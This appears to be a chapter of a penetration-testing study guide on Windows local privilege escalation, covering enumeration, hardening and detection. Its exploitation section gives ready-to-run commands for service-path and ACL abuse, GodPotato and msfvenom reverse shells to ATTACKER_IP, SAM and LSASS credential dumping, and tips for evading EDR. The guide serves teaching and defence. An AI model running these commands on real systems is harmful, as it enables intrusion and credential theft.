## 1. Overview

Windows is the dominant enterprise endpoint OS. Its security model is
built on several core mechanisms that every offensive and defensive
practitioner must understand: security identifiers (SIDs), access
control lists (ACLs), access tokens, integrity levels, and User Account
Control (UAC). Misunderstanding any of these leads to blind spots in
both attack and defense.

**Core concepts:**

- **SID (Security Identifier)** - a unique identifier for every security
  principal (user, group, computer, service). Format: `S-1-5-21-<domain>-<RID>`.
  Well-known SIDs: `S-1-5-18` (LocalSystem), `S-1-5-19` (LocalService),
  `S-1-5-20` (NetworkService), `S-1-5-32-544` (Administrators).
- **RID (Relative Identifier)** - the last component of a SID; identifies
  the principal within its domain. `500` = built-in Administrator,
  `501` = Guest, `512` = Domain Admins.
- **Access Token** - the security context of a running process. Contains
  the user SID, group SIDs, privileges, and integrity level.
- **ACL (Access Control List)** - a list of ACEs (Access Control Entries)
  attached to a securable object. Each ACE grants or denies a specific
  access right to a specific SID.
- **Integrity Level** - Low, Medium, High, System. Determines whether a
  process can write to objects of a given integrity.
- **UAC (User Account Control)** - the mechanism that gates elevation.
  Even administrators run with a filtered (Medium) token by default.

**Registry hives:**

- **HKLM\SAM** - local account database (password hashes).
- **HKLM\SECURITY** - LSA secrets, cached domain credentials.
- **HKLM\SYSTEM** - system configuration, services, drivers.
- **HKLM\SOFTWARE** - installed software, policies.
- **HKU\<SID>** - per-user settings (loaded from NTUSER.DAT).

**Service Control Manager (SCM):**

- Manages Windows services (`services.exe`).
- Each service has a binary path, start type, and logon account.
- Misconfigured service permissions are a primary local privesc vector.

## 2. Reconnaissance / Enumeration

**Offensive - system info:**

    # OS version, patch level, architecture
    systeminfo
    wmic os get Caption,Version,BuildNumber,OSArchitecture

    # Installed hotfixes
    wmic qfe list brief
    Get-HotFix

    # Current user and groups
    whoami /all

    # Domain info
    echo %USERDOMAIN%
    nltest /dsgetdc:%USERDOMAIN%

**Offensive - services and drivers:**

    # All services with binary paths
    sc query state= all
    wmic service get Name,DisplayName,PathName,StartMode,StartName

    # Non-Microsoft services (less noise for privesc)
    Get-Service | Where-Object { $_.DisplayName -notmatch 'Microsoft' }

    # Service permissions (via accesschk.exe from Sysinternals)
    accesschk.exe /accepteula -uwcqv "Everyone" *
    accesschk.exe /accepteula -uwcqv "Users" *

**Offensive - scheduled tasks:**

    schtasks /query /fo LIST /v
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" }

**Offensive - installed software and processes:**

    wmic product get Name,Version
    Get-Process | Select-Object Name,Id,Path,Company
    Get-CimInstance Win32_StartupCommand

**Offensive - network and shares:**

    netstat -ano
    net share
    net session
    net use

**Offensive - user and group info:**

    net user
    net localgroup
    net localgroup Administrators
    net accounts

**Defensive - what to baseline:**

- Service binary paths and permissions.
- Scheduled tasks with SYSTEM or admin principals.
- Startup programs and Run keys.
- Installed software and patch level.
- Local admin group membership.

## 3. Common Attack Vectors

Windows local attacks fall into a small number of well-known families:

**Service misconfigurations:**

- **Unquoted service path** - a service path with spaces but no quotes;
  Windows tries each space-separated prefix as an executable.
- **Weak service ACL** - `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`
  for `Users` or `Authenticated Users`; allows reconfiguring the binary.
- **Writable service binary** - the service executable is writable by a
  low-privileged user.
- **Writable service directory** - the directory is writable; allows
  DLL planting (if the service loads DLLs from its own directory).

**Token and privilege abuse:**

- **SeImpersonatePrivilege** - held by service accounts (IIS, MSSQL,
  etc.); abused via JuicyPotato, RoguePotato, PrintSpoofer,
  GodPotato.
- **SeAssignPrimaryTokenPrivilege** - similar to SeImpersonate.
- **SeDebugPrivilege** - held by administrators; allows dumping LSASS
  and opening any process.
- **SeBackupPrivilege / SeRestorePrivilege** - allows reading/writing
  any file, bypassing ACLs.
- **SeTakeOwnershipPrivilege** - allows taking ownership of any object.
- **SeLoadDriverPrivilege** - allows loading kernel drivers.

**DLL hijacking:**

- **Missing DLL** - an application loads a DLL from a writable directory
  before the legitimate one.
- **Search order hijacking** - Windows searches the current directory
  before System32 in legacy configurations.
- **Phantom DLL hijacking** - a missing DLL entry in the registry that
  points to a writable path.

**Registry and configuration:**

- **AutoRun keys** - writable by low-privileged users in misconfigured
  setups.
- **AlwaysInstallElevated** - MSI files run as SYSTEM; if both HKLM and
  HKCU keys are set, any user can install an MSI as SYSTEM.
- **Autologon credentials** - stored in `HKLM\SOFTWARE\Microsoft\
  Windows NT\CurrentVersion\Winlogon` in plaintext.
- **Unattend.xml / sysprep.inf** - often left on disk with plaintext or
  base64 passwords.

**Kernel and driver:**

- **Unpatched kernel vulnerabilities** - e.g. CVE-2021-1732,
  CVE-2022-21882, CVE-2023-28252 (CLFS).
- **Vulnerable drivers** - BYOVD (Bring Your Own Vulnerable Driver)
  for privilege escalation or EDR bypass.

**Credentials in files:**

- **Configuration files** (`web.config`, `*.config`, `*.ini`, `*.xml`)
  with plaintext or weakly encoded passwords.
- **Scripts** (PowerShell, batch, VBS) with hardcoded credentials.
- **PuTTY sessions, RDP files, KeePass databases.**

## 4. Exploitation Recipes

**whoami /all - the single most important enumeration command:**

    whoami /all

    # Expected output:
    # USER INFORMATION
    # User Name        SID
    # ================ ==============================================
    # corp\user        S-1-5-21-...-1105
    #
    # GROUP INFORMATION
    # Group Name                             Type             SID
    # ====================================== ================ ==========
    # BUILTIN\Users                          Alias            S-1-5-32-545
    # BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555
    # ...
    #
    # PRIVILEGES INFORMATION
    # Privilege Name                Description                          State
    # ============================= ==================================== ========
    # SeShutdownPrivilege           Shut down the system                 Disabled
    # SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
    # ...

    # Key things to look for:
    # - SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege -> potato attacks
    # - SeDebugPrivilege -> dump LSASS
    # - SeBackupPrivilege / SeRestorePrivilege -> read any file
    # - SeTakeOwnershipPrivilege -> take ownership
    # - SeLoadDriverPrivilege -> load a driver

**Unquoted service path - check and exploit:**

    # 1. Find services with unquoted paths containing spaces
    wmic service get Name,DisplayName,PathName,StartMode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """"

    # Or with PowerUp
    .\PowerUp.ps1
    Invoke-AllChecks

    # 2. If a vulnerable path exists (e.g. C:\Program Files\Vuln App\service.exe)
    # and the parent directory is writable, plant the executable:
    copy payload.exe "C:\Program Files\Vuln.exe"

    # 3. Restart the service
    sc stop VulnService
    sc start VulnService

**Weak service ACL - check and exploit:**

    # 1. Check service ACLs (accesschk.exe from Sysinternals)
    accesschk.exe /accepteula -uwcqv "Users" *
    accesschk.exe /accepteula -uwcqv "Authenticated Users" *

    # 2. If a service grants SERVICE_CHANGE_CONFIG to Users:
    sc config VulnService binPath= "C:\Windows\Temp\payload.exe"
    sc stop VulnService
    sc start VulnService

    # Expected output:
    # [SC] ChangeServiceConfig SUCCESS
    # [SC] StartService FAILED 1053: The service did not respond...

**SeImpersonatePrivilege -> GodPotato (modern, works on Server 2019/2022):**

    # Upload GodPotato.exe, then execute a command as SYSTEM
    .\GodPotato.exe -cmd "cmd /c whoami"

    # Expected output:
    # nt authority\system

    # Or spawn a reverse shell
    .\GodPotato.exe -cmd "cmd /c powershell -e <BASE64_PAYLOAD>"

    # Alternative: PrintSpoofer (works on Server 2016/2019)
    .\PrintSpoofer.exe -i -c cmd

    # Alternative: RoguePotato (requires a redirector)
    .\RoguePotato.exe -r <ATTACKER_IP> -e "cmd /c whoami" -l 9999

**AlwaysInstallElevated:**

    # 1. Check the two registry keys
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    # Both must be 0x1 for exploitation.

    # 2. Generate a malicious MSI
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o payload.msi

    # 3. Install it (runs as SYSTEM)
    msiexec /quiet /qn /i C:\Windows\Temp\payload.msi

**Autologon credentials:**

    # Check for plaintext credentials
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

    # Expected output:
    # DefaultUserName    REG_SZ    Administrator
    # DefaultPassword    REG_SZ    <PASSWORD>

**Unattend.xml / sysprep.inf:**

    # Common locations
    C:\unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\System32\sysprep\unattend.xml
    C:\Windows\System32\sysprep\sysprep.inf

    # Passwords are often base64-encoded
    # Decode: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<B64>"))

**SeBackupPrivilege -> dump SAM/SYSTEM:**

    # With SeBackupPrivilege, read SAM and SYSTEM
    reg save HKLM\SAM C:\Windows\Temp\SAM
    reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

    # Exfiltrate and extract hashes
    secretsdump.py -sam SAM -system SYSTEM LOCAL

    # Expected output:
    # Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::

**SeDebugPrivilege -> dump LSASS:**

    # With SeDebugPrivilege, dump LSASS memory
    # On the target (if you have a shell as admin):
    procdump.exe -accepteula -ma lsass.exe lsass.dmp

    # Or with Mimikatz (requires SeDebugPrivilege)
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords

    # Or with Task Manager (GUI): right-click lsass.exe -> Create dump file

## 5. Post-Exploitation

**On a compromised Windows host:**

- **Dump LSASS** - `procdump`, `comsvcs.dll MiniDump`, Mimikatz.
- **Dump SAM/SYSTEM** - `reg save`, `secretsdump.py -sam -system`.
- **Dump LSA secrets** - `secretsdump.py -security` (service accounts,
  cached domain credentials).
- **Dump cached domain credentials** - `secretsdump.py -security` (DCC2).
- **Search for credentials in files** - see "Credentials in files" in
  section 3.
- **Enumerate shares** - `net share`, `net view`, `smbclient`.
- **Enumerate sessions** - `net session`, `quser`.
- **Enumerate scheduled tasks and services** for persistence options.

**Persistence on a host:**

- Run keys (HKCU and HKLM).
- Scheduled tasks (SYSTEM).
- Services (SYSTEM).
- WMI event subscriptions (fileless).
- Startup folder.
- DLL search order hijacking.
- COM hijacking.

**Lateral movement from a host:**

- See `01 Active Directory / 05 Lateral Movement`.
- Key: `net use`, `psexec`, `wmiexec`, `evil-winrm`, RDP, WinRM.

## 6. Risk Context

Windows hosts are the most common enterprise endpoint. A single
compromised host often yields:

- Cleartext credentials (if the user logged in interactively).
- NTLM hashes for the user (reusable).
- Kerberos tickets for active sessions (reusable).
- Domain-wide access if the compromised user is privileged.
- A foothold for lateral movement to other hosts.

**Blast radius:** a compromised workstation with a Domain Admin logged
on is equivalent to a domain compromise. A compromised server with a
service account is equivalent to that service's scope.

**Why attacks succeed:**

- Local admin on all workstations (legacy "IT admin" model).
- Password reuse across local admin accounts.
- Unquoted service paths (legacy installers).
- Weak service ACLs (misconfigured installers).
- AutoRun keys writable by users.
- AlwaysInstallElevated misconfigured.
- Autologon credentials in the registry.
- Unattend.xml left on disk.
- Kernel not patched.

## 7. Root Causes

- **Legacy installers.** Unquoted service paths and weak service ACLs
  come from installers written before modern security practices.
- **Default insecure configurations.** AutoRun, autologon,
  AlwaysInstallElevated - all off by default but commonly enabled.
- **Weak ACLs.** Non-admin principals given write access to system
  directories or registry keys.
- **Credentials in plaintext.** Autologon, Unattend, config files.
- **Unpatched systems.** Kernel vulnerabilities are exploited in
  minutes in mature environments.
- **Over-privileged service accounts.** Service accounts with
  SeImpersonate are common (IIS, MSSQL); combined with weak ACLs, they
  become privesc vectors.

## 8. Preventive Controls

**Service hardening:**

- Quote all service paths.
- Restrict service ACLs to administrators.
- Install services in directories writable only by admins.
- Use dedicated service accounts (not LocalSystem) where possible.

**Token and privilege hardening:**

- Remove SeImpersonatePrivilege from service accounts where possible.
- Use Protected Users group for privileged accounts (blocks
  SeImpersonate and delegation).
- Restrict SeDebugPrivilege to administrators.

**Registry hardening:**

- Disable autologon (or use LSA secrets instead of plaintext).
- Disable AlwaysInstallElevated.
- Restrict write access to AutoRun keys.

**Credential hygiene:**

- Remove Unattend.xml from deployed systems.
- Do not store plaintext passwords in config files.
- Use managed service accounts (gMSA) for services.
- Enable Credential Guard on Windows 10/11 and Server 2016+.
- Enable LSA Protection (RunAsPPL).

**Patch management:**

- Patch kernel vulnerabilities within days, not months.
- Use Microsoft Defender Application Control (WDAC) or AppLocker to
  block unauthorized executables.
- Disable legacy features (SMBv1, WDigest, Office macros from internet).

**Monitoring:**

- Enable PowerShell script block logging.
- Enable Sysmon with a modern configuration (SwiftOnSecurity, Olaf
  Hartong).
- Forward logs to a SIEM in near real time.

## 9. Detection Controls

**Privilege escalation:**

- Event 4688 (process creation) - look for `cmd.exe`, `powershell.exe`,
  or `msiexec.exe` spawned by services.
- Event 4672 (special privileges assigned) - especially SeDebugPrivilege
  for non-admin users.
- Event 4697 (service installed via API) - suspicious service creation.
- Event 7045 (service installed via SCM) - service creation.
- Sysmon event 1 (process creation) with suspicious parents (services,
  scheduled tasks).
- Sysmon event 11 (file create) - executables in unusual directories
  (Temp, ProgramData).

**Credential dumping:**

- Event 4656 / 4663 (handle to LSASS) - direct access to lsass.exe.
- Event 4688 with `procdump`, `comsvcs.dll`, `mimikatz`.
- Sysmon event 10 (process access) with target `lsass.exe` and granted
  access `0x1010` or `0x1410`.

**Registry persistence:**

- Event 4657 (registry value modified) - Run keys, Winlogon, IFEO.
- Sysmon event 12 / 13 / 14 (registry events).

**Scheduled tasks:**

- Event 4698 (task created), 4699, 4700, 4701, 4702.
- Sysmon event 1 with parent `schtasks.exe` or `taskeng.exe`.

**WMI persistence:**

- Event 5860 / 5861 (WMI permanent subscription).
- Sysmon event 19 / 20 / 21 (WMI events).

**Lateral movement:**

- Event 4624 (logon) - Type 3 (network), Type 10 (RemoteInteractive).
- Event 4648 (explicit credential logon) - `runas`, PsExec, scheduled
  tasks.
- Event 5140 / 5145 (share access) - ADMIN$, C$, IPC$.

**General:**

- Honeytokens: fake credentials in config files, fake admin accounts.
- Baseline normal process trees; alert on anomalies.

## 10. Verification

**Offensive - did the attack succeed?**

- Unquoted service path: shell as SYSTEM after service restart.
- Weak service ACL: reconfiguration succeeds; shell as SYSTEM.
- SeImpersonate: GodPotato or PrintSpoofer returns `nt authority\system`.
- AlwaysInstallElevated: MSI installs as SYSTEM.
- Autologon / Unattend: credentials work for local or domain auth.
- SeBackupPrivilege: SAM/SYSTEM dumps succeed; hashes extractable.
- SeDebugPrivilege: LSASS dump contains cleartext or hashes.

**Defensive - are controls effective?**

- Test unquoted path: `wmic service get PathName` shows all paths are
  quoted.
- Test weak ACL: `accesschk -uwcqv Users *` returns no writable services.
- Test SeImpersonate: service accounts are in Protected Users; potato
  attacks fail.
- Test AlwaysInstallElevated: registry keys are not set.
- Test autologon: `DefaultPassword` key is not present.
- Test Unattend: no Unattend.xml on disk.
- Test patch level: `wmic qfe list` includes recent critical patches.

## 11. OSCP Notes

- Windows local privesc is a common OSCP requirement. Practice:
  - `whoami /all` - always the first command.
  - `systeminfo` - OS version and patch level.
  - `wmic service` + `accesschk` - unquoted paths and weak ACLs.
  - `GodPotato` / `PrintSpoofer` - SeImpersonate.
  - `winPEAS` / `Seatbelt` - automated enumeration.
- **Capture screenshots** of:
  - `whoami /all` showing the target privilege.
  - The unquoted path or weak service ACL.
  - The exploitation command and the resulting SYSTEM shell.
  - Any credential extraction (LSASS dump, SAM dump).
- The `> [!IMPORTANT]` OSCP reporting note applies to the foothold,
  privesc step, and any credential extraction.

## 12. Production Notes

- Windows privesc vectors in production are usually the same as in the
  lab, but EDR blocks the noisy tools (Mimikatz, GodPotato) at runtime.
- Modern EDR (CrowdStrike, SentinelOne, Defender ATP) hooks LSASS
  access; use indirect techniques (comsvcs.dll, direct syscalls) or
  avoid LSASS entirely.
- Kernel exploits are rare in production (patching is good), but BYOVD
  is increasingly common for EDR bypass.
- In mature environments, focus on credential theft from files and
  registry rather than memory dumping.
- Assume the attacker has local admin; the real defense is preventing
  DA logons on member servers (tiered administration).

## 13. References

**Microsoft documentation:**

- Windows Security Documentation - https://learn.microsoft.com/en-us/windows/security/
- Access Control Lists (ACLs) - https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists
- Access Tokens - https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens
- User Account Control - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/
- Service Control Manager - https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager

**MITRE ATT&CK:**

- Privilege Escalation - Exploitation for Privilege Escalation (T1068) - https://attack.mitre.org/techniques/T1068/
- Privilege Escalation - Access Token Manipulation (T1134) - https://attack.mitre.org/techniques/T1134/
- Privilege Escalation - Hijack Execution Flow (T1574) - https://attack.mitre.org/techniques/T1574/
- Credential Access - OS Credential Dumping (T1003) - https://attack.mitre.org/techniques/T1003/

**Tools:**

- winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- Seatbelt - https://github.com/GhostPack/Seatbelt
- PowerUp - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- GodPotato - https://github.com/BeichenDream/GodPotato
- PrintSpoofer - https://github.com/itm4n/PrintSpoofer
- accesschk - https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

**Research:**

- HackTricks - Windows Local Privilege Escalation - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings - Windows Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- FuzzySecurity - Windows Privilege Escalation Fundamentals - https://fuzzysecurity.com/tutorials/16.html
- MITRE ATT&CK - Windows - https://attack.mitre.org/matrices/enterprise/windows/
